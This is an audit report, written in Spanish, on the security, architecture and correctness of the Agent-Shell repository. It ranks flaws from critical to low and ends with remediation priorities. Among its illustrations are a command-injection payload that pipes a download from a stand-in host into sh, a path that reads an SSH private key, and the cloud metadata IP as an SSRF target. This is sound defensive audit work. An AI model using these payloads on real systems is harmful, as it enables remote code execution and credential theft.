# Auditoría — Agent-Shell (MauricioPerera/Agent-Shell)

Repo clonado en `D:\Repo\shell`, commit al momento de clonar. Alcance: seguridad, calidad/arquitectura, correctness/bugs. Método: 4 revisiones paralelas por área + verificación manual de los hallazgos críticos + `npm install && npm test` real.

## Resumen ejecutivo

- **2 hallazgos CRÍTICOS de seguridad** verificados línea por línea: inyección de comandos en `git:*` y autenticación HTTP deshabilitada por defecto.
- Suite de tests: **974/975 pasan**. El único test que falla (`agent-permissions.test.ts` DF01) es la prueba automatizada del mismo bug de filtrado de permisos en `search` que encontró la auditoría — el repo ya sabe que está roto.
- `npm audit`: 8 vulnerabilidades en dependencias (1 crítica, 4 altas, 3 moderadas) — no investigadas en detalle, quedan fuera de este alcance.
- El "sandbox" de shell (`just-bash`) se puede evitar por completo: 3 de 6 grupos de skills (`workspace`, `cron`, `process`) ignoran el adapter configurado y ejecutan `execSync`/`spawn` directo.

---

## 🔴 CRÍTICO

### 1. Inyección de comandos en `git:*` — RCE
**[shell-git.ts](src/skills/shell-git.ts)** — `clone` (L83-84), `commit` (L100), `push`/`pull` (L105, L110). Todos concatenan `args.url/branch/remote/message` sin escapar dentro de un string que corre por `execSync` (spawnea shell real). Ejemplo: `git:commit --message '$(curl evil.sh|sh)'` — el escape de comillas dobles no neutraliza `$()`. Gate: solo permiso RBAC `git:write`, sin sanitización de input.

### 2. Auth HTTP deshabilitada por defecto — RCE de red
**[http-transport.ts:47,136-142](src/mcp/http-transport.ts)** — `authToken = config?.auth?.bearerToken ?? null`. Si el operador no configura explícitamente un bearer token, el chequeo de auth se salta entero y cualquiera que llegue al puerto puede invocar `tools/call` → `cli_exec` → cualquier skill registrada (incluyendo `shell:exec`). Sin enforcement de `Origin`/CSRF tampoco: una página web visitada por el operador puede hacer POST ciego a `/rpc`.

---

## 🟠 ALTO

| # | Archivo | Problema |
|---|---|---|
| 3 | [shell-http.ts:9-31](src/skills/shell-http.ts) | SSRF — `args.url` va directo a `fetch()`, sin bloquear loopback/metadata IP (`169.254.169.254`) |
| 4 | [secret-store.ts:19-41](src/skills/secret-store.ts) | AES-256-**CBC sin autenticar** (el propio `contracts/security.md` prohíbe esto) + derivación de clave por zero-pad/truncate, sin KDF. Contrasta con `encrypted-storage-adapter.ts`, que sí usa GCM correctamente |
| 5 | [core/index.ts:322-328](src/core/index.ts) | El builtin `search` filtra permisos contra `cmd.requiredPermissions`, pero `registry.get()` devuelve `{ok, value:{definition,...}}`, no la definición — el filtro nunca excluye nada. Fuga de qué comandos existen (no de ejecución, que sí está protegida en otro lado). **Confirmado por el test que falla.** |
| 6 | [skills/index.ts:99,105,111](src/skills/index.ts) | `workspace`, `cron`, `process` no reciben el `shellAdapter` configurado — bypasean el sandbox `just-bash` aunque el operador lo haya pedido explícitamente |
| 7 | [command-registry/index.ts:111-150](src/command-registry/index.ts) | `resolve()`/`get()`/`listByNamespace()` son O(n) escaneando todo el Map; el contrato promete O(1)/O(k). Se ejecuta en cada dispatch de comando |
| 8 | [cron.ts:88](src/skills/cron.ts), [workspace.ts:155](src/skills/workspace.ts) | `execSync` bloquea el event loop del servidor entero hasta 60-120s durante un cron o `workspace:run` |

---

## 🟡 MEDIO

- **[secret-patterns.ts:38-42](src/security/secret-patterns.ts)** — el patrón `private-key` solo redacta la línea `-----BEGIN...-----`, el cuerpo base64 de la clave queda en texto plano.
- **[pgvector-storage-adapter.ts](src/vector-index/pgvector-storage-adapter.ts)** — `tableName` se interpola sin validar en SQL (`TRUNCATE ${tableName}`, etc.) — inyección si el nombre de tabla llega a ser configurable por tenant.
- **[shell-file.ts](src/skills/shell-file.ts), [workspace.ts](src/skills/workspace.ts)** — sin jail de rutas: `file:read --path ~/.ssh/id_rsa` funciona si el agente tiene el permiso genérico `file:read`.
- **[secret-patterns.ts:13-22](src/security/secret-patterns.ts)** — regex de tokens excluye `+ / =` (alfabeto base64 estándar), tokens reales pueden escapar la redacción.
- **[http-transport.ts:138](src/mcp/http-transport.ts)** — comparación de bearer token con `!==` (no constant-time), timing side-channel teórico.
- **Inconsistencia AND/OR en filtros por tags** entre `vector-index/index.ts`+`matryoshka.ts` (AND) vs `pgvector-storage-adapter.ts`+`minimemory/*` (OR) — misma query, resultados distintos según config.
- **[context-store/index.ts](src/context-store/index.ts) + [sqlite-storage-adapter.ts:172-249](src/context-store/sqlite-storage-adapter.ts)** — race condition read-modify-write sin locking; cada `save()` hace `DELETE`+re-`INSERT` completo de toda la sesión en vez de updates parciales (contradice su propio docstring).
- **[core/index.ts](src/core/index.ts)** — `Core` nunca delega a `Executor`: sin conversión/validación de tipos, undo hardcodeado a "not implemented", sin timeout por-handler.
- **jq-filter**: `parser.ts` rompe con multi-select anidado (`[.a, [.b, .c]]`) pese a que la gramática del propio contrato lo permite; `resolver.ts` no implementa el cap de 10,000 elementos que el contrato exige.
- **Batch execution corre en paralelo** (`Promise.allSettled`) en `executor/index.ts` y `core/index.ts`, pero ambos contratos dicen explícitamente "secuencial, no paralelo en v1".
- **[executor/index.ts:542-554](src/executor/index.ts)** — timeout hace `race()` pero nunca cancela el handler; puede seguir corriendo y mutar estado tras reportar error.

---

## 🟢 BAJO / estilo

- Resultado de comandos no enmascarado antes de guardar en history (`executor/index.ts:576-588`) — solo `args` pasa por `maskSecrets`, `result` no.
- `process-mgr.ts:41-47` — split manual de args + `shell:true` simultáneo (anti-patrón confirmado en vivo por el warning `DEP0190` de Node durante los tests).
- Estado global singleton en workspace/cron/process — en modo HTTP, todos los clientes concurrentes comparten un solo `cwd`/env/cron-set.
- `NAME_REGEX`/`validateName` duplicado byte-a-byte en `scaffold.ts` y `wizard.ts`.
- Patrón `while (arr.length > MAX) arr.shift()` reimplementado 4 veces en 3 archivos.
- `--limit -5` pasa la validación del parser (regex acepta signo) y silenciosamente recorta resultados en vez de rechazar.
- Sin test file para `src/cli/index.ts`, `src/server/index.ts`, `src/index.ts` (barrel).

---

## Positivo (verificado, sin bugs)

- RBAC (`rbac.ts`, `permission-matcher.ts`): resolución de roles con protección contra ciclos, precedencia de wildcards fail-closed.
- `encrypted-storage-adapter.ts`: AES-256-GCM correcto (IV random, auth tag, longitud de clave verificada).
- `sqlite-registry-adapter.ts` y `pgvector-storage-adapter.ts` (valores, no identificadores): SQL parametrizado correctamente, sin concatenación.
- Registro duplicado de comandos correctamente rechazado (`COMMAND_ALREADY_EXISTS`), no sobreescrito.
- Tokenizer del parser: casos borde de comillas/vacío bien manejados.
- `matryoshka.ts`: lógica de funnel/truncation internamente consistente.

---

## Prioridad de remediación sugerida

1. Sanitizar/parametrizar `shell-git.ts` (usar `execFile` con array de args, no `execSync` con string interpolado).
2. Exigir bearer token por defecto en `http-transport.ts` (fail-closed si no se configura, o forzar bind a localhost-only con warning explícito).
3. Arreglar el filtro de permisos en `search` (`core/index.ts:322-328`) — ya hay un test rojo esperando esto.
4. Migrar `secret-store.ts` a AES-256-GCM + KDF real (copiar el patrón de `encrypted-storage-adapter.ts`).
5. Sanitizar `shell-http.ts` contra SSRF (bloquear loopback/link-local/metadata).
